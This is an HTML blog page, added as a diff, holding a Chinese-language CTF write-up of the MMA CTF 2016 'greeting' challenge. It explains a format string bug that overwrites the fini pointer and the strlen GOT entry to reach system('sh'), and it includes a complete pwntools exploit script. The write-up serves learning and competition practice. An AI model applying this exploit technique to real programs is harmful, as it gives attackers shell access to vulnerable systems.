@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>  [MMA CTF 2016] greeting
+ | naetw's blog</title>
+
+    <meta name="author" content="Naetw"/>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/jquery.mglass.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/pygment-solarized-dark.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/style.css"/>
+
+    <!-- Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>
+
+
+    <link rel="icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+
+    <!-- Feeds -->
+      <link href="https://naetw.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - All posts - Atom Feed"/>
+      <link href="https://naetw.github.io/feeds/write-up.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - Category: write-up - Atom Feed"/>
+
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="page-header">
+        <h1><a href="https://naetw.github.io">naetw's blog</a> <small></small></h1>
+      </div>
+
+      <nav class="navbar navbar-default">
+
+        <!-- Hamburger menu for mobile -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="https://naetw.github.io" title="">naetw's blog</a>
+        </div>
+
+        <!-- Menus and search forms -->
+        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">
+
+          <ul class="nav navbar-nav">
+<li >
+                <a href="/archives">Archives</a>
+              </li>
+<li >
+                <a href="/categories">Categories</a>
+              </li>
+<li >
+                <a href="/tags">Tags</a>
+              </li>
+          </ul>
+
+
+
+        </div>
+
+      </nav>
+
+    </div>
+
+
+    <div class="container main">
+
+
+      <div class="row">
+        <div class=" col-md-9  ">
+  <h1>
+    <a href="https://naetw.github.io/posts/2016/09/06/mma-ctf-2016-greeting/" rel="bookmark" title="Permalink to [MMA CTF 2016] greeting">[MMA CTF 2016] greeting</a>
+  </h1>
+        </div>
+      </div>
+
+      <div class="row">
+
+
+        <div class=" col-md-9 " id="content" role="main">
+  
+
+  <div>
+    <h2>Description</h2>
+<blockquote>
+<p>程式很簡單小小的，存在 <code>format string</code> 的洞，但是卻不知道要怎樣利用，call 完 <code>printf</code> 就沒再 call 其他 function 了，然後發現有 <code>stack guard</code> 的保護，於是一直想辦法去寫爛 <code>canary</code> 然後順便把 <code>__stack_chk_fail</code> 的 GOT 給 hijack 掉，但是想了各種方法都失敗 Orz，想過用類似 BP chain 的方式把它寫爛，但是他只讀 64bytes 實在是不夠用....</p>
+<p>只能說自己經驗太少，只會往自己玩過方向走QQ，從早上看到下午都在鑽那些不能的點實在太菜了... 後來有了<strong>@leepupu</strong>的提示--&gt; overwrite <code>fini</code> 才繼續解這題@@</p>
+</blockquote>
+<p><code>fini</code> 是一個 call 完 <code>main</code> 之後會呼叫的 function，他的 function address 在 <code>.bss</code>段，我一開始還在想要做 ROP 後來發現太麻煩了，然後這時候 trello 通知跳出來＠＠ <strong>@bananaapple</strong> 把作法貼了上去，不小心讀到，才發現他那樣做簡單又方便QQ 我的想法太蠢QQ</p>
+<h2>Exploit</h2>
+<p>在 <code>getnline</code> 這個 function 裡頭的最後一段 code 是長這樣的：</p>
+<div class="highlight"><pre><span></span><span class="k">return</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</pre></div>
+
+
+<p>s 是我們輸入的 input 儲存的 char array 開頭，所以目標就是把 <code>fini</code> 改寫成 main 讓他再跑一次，然後順便改寫 <code>strlen</code> 的 GOT，改成 <code>system</code> 這麼一來 return to main 之後 input 輸入 sh，這樣一來在上面那段 return 前 就會變成 <code>system('sh')</code> shell 就開起來了@@</p>
+<p>有一點要注意的是因為他可讀的大小只有 64 bytes，所以一次改 2bytes 才不會改不完而造成程式 crash。</p>
+<p>我的 exploit 是後來改成讓程式自己算 padding 長度，其實可以直接開 <code>ipython</code> 或啥的計算機手算也蠻快的@@</p>
+<p><code>return to main</code> 真好用QQ</p>
+<h2>Final Exploit:</h2>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">)</span>
+<span class="c1">#r = remote(&#39;pwn2.chal.ctf.westerns.tokyo&#39;, 16317)</span>
+
+<span class="nb">raw_input</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="p">)</span>
+
+<span class="n">main</span> <span class="o">=</span> <span class="mh">0x080485ed</span>
+<span class="n">system</span> <span class="o">=</span> <span class="mh">0x8048490</span>
+<span class="n">strlen_got</span> <span class="o">=</span> <span class="mh">0x08049a54</span>
+<span class="n">fini</span> <span class="o">=</span> <span class="mh">0x08049950</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;AA&#39;</span> <span class="c1"># padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">strlen_got</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># put this in first since the higher bytes i want is 0x0804 which is smaller than 0x8490</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">strlen_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">fini</span><span class="p">)</span> <span class="c1"># since the address of fini is 0x0804xxxx so we just have to change its lower 2 bytes -&gt; 0x85ed</span>
+
+<span class="n">printed</span> <span class="o">=</span> <span class="mi">20</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="mi">3</span>
+
+<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">func</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">low_or_high</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">low_or_high</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">((((</span><span class="n">func</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xffff</span> <span class="o">+</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xffff</span>
+    <span class="k">else</span> <span class="p">:</span>
+        <span class="k">return</span> <span class="p">((((</span><span class="n">func</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xffff</span> <span class="o">+</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xffff</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">system</span>
+    <span class="k">else</span> <span class="p">:</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">main</span>
+    <span class="n">padding</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">printed</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">padding</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="si">%%%d</span><span class="s1">c&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">padding</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="si">%%%d</span><span class="s1">$hn&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="mi">12</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">printed</span> <span class="o">+=</span> <span class="n">padding</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+
+<p>還有很多要學，加油吧。</p>
+  </div>
+
+
+
+        </div>
+
+          <div class="col-md-3">
+  <div class="well">
+
+    <p><abbr title="2016-09-06T20:33:00+08:00"><i class="fa fa-calendar"></i> Tue 06 September 2016</abbr></p>
+
+      <p><address>
+        <i class="fa fa-user"></i> By
+          <a href="https://naetw.github.io/author/naetw.html" rel="author">Naetw</a>
+      </address></p>
+
+    <hr/>
+
+      <p>
+              <a href="https://naetw.github.io/category/write-up/" rel="tag"
+                  data-toggle="tooltip" class="label label-info"
+                  title="10 articles in this category">write-up</a>
+            <a href="/tag/ctf/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">CTF</a>
+            <a href="/tag/pwn/" data-toggle="tooltip"
+      class="label label-default"
+      title="10 articles with this tag">pwn</a>
+            <a href="/tag/got-hijacking/" data-toggle="tooltip"
+      class="label label-default"
+      title="4 articles with this tag">GOT Hijacking</a>
+            <a href="/tag/format-string/" data-toggle="tooltip"
+      class="label label-default"
+      title="2 articles with this tag">Format String</a>
+            <a href="/tag/mma/" data-toggle="tooltip"
+      class="label label-default"
+      title="1 article with this tag">MMA</a>
+      </p>
+      <hr/>
+
+
+
+  </div>
+            
+          </div>
+
+      </div>
+
+    </div>
+
+    <!-- TODO: make footer sticky -->
+    <footer class="container-fluid">
+      <div class="container">
+        <div class="row">
+
+            <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="https://github.com/Naetw">
+      <i class="fa fa-github"></i>
+    GitHub
+  </a></li>
+                </ul>
+            </div>
+            <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=getpelican.com&size=16" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                </ul>
+            </div>
+
+          <div class="col-md-2">
+            <h5>Browse content by</h5>
+            <ul class="list-unstyled">
+                <li><a href="https://naetw.github.io/categories/index.html"><i class="fa fa-tags"></i> Categories</a></li>
+                <li><a href="https://naetw.github.io/archives/index.html"><i class="fa fa-calendar"></i> Dates</a></li>
+                <li><a href="https://naetw.github.io/tags/index.html"><i class="fa fa-tag"></i> Tags</a></li>
+            </ul>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Copyright notice</h5>
+            <p>© Copyright 2016-2017 Naetw.</p>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Disclaimer</h5>
+              <p>All opinions expressed in this site are my own personal opinions and are not endorsed by, nor do they represent the opinions of my previous, current and future employers or any of its affiliates, partners or customers.</p>
+          </div>
+
+          <div class="col-md-2">
+              <h5>Feeds</h5>
+              <ul class="list-unstyled">
+                  <li><small><a href="https://naetw.github.io/feeds/all.atom.xml"><i class="fa fa-rss"></i> All posts (Atom)</a></small></li>
+                  <li><small><a href="https://naetw.github.io/feeds/write-up.atom.xml"><i class="fa fa-rss"></i> Category: write-up (Atom)</a></small></li>
+              </ul>
+          </div>
+
+        </div>
+      </div>
+
+      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>
+
+      <div class="container">
+        <div class="row col-md-12 text-muted text-center">
+          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
+          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
+        </div>
+      </div>
+
+    </footer>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+    <script src="https://naetw.github.io/theme/js/jquery.mglass.js"></script>
+    <script src="https://naetw.github.io/theme/js/application.js"></script>
+
+  </body>
+</html>
